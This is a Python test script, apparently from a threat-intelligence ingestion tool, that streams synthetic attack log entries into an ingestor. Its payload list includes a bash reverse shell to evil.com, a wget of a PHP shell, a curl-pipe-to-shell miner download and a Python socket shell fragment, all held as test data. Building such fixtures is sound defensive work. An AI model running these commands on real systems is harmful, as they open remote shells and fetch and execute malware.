import asyncio
import random
import json
from src.db import threat_db
from src.ingestion.base_ingestor import BaseIngestor

async def continuous_threat_stream():
    """Generate continuous threat events for testing"""
    
    await threat_db.init_pool()
    ingestor = BaseIngestor("continuous_test", {'batch_size': 1})
    await ingestor.start()
    
    threat_ips = [
        "91.109.190.234",  # Russia
        "218.92.0.107",   # China  
        "185.220.101.182", # Tor exit
        "203.0.113.45"    # Unknown
    ]
    
    payloads = [
        "bash -i >&/dev/tcp/evil.com/4444 0>&1",
        "wget http://malware.ru/shell.php",
        "python -c 'import socket,subprocess,os'",
        "curl -s https://cryptominer.com/xmrig | sh"
    ]
    
    while True:
        # Generate random threat
        log_entry = {
            "source_ip": random.choice(threat_ips),
            "payload": random.choice(payloads),
            "timestamp": "2024-01-15T" + f"{random.randint(10,23):02d}:30:00Z"
        }
        
        json_data = json.dumps(log_entry).encode()
        events = await ingestor.parse_data(json_data)
        
        print(f"Generated live threat: {events[0].ip if events else 'None'}")
        
        # Wait 10 seconds before next threat
        await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(continuous_threat_stream())
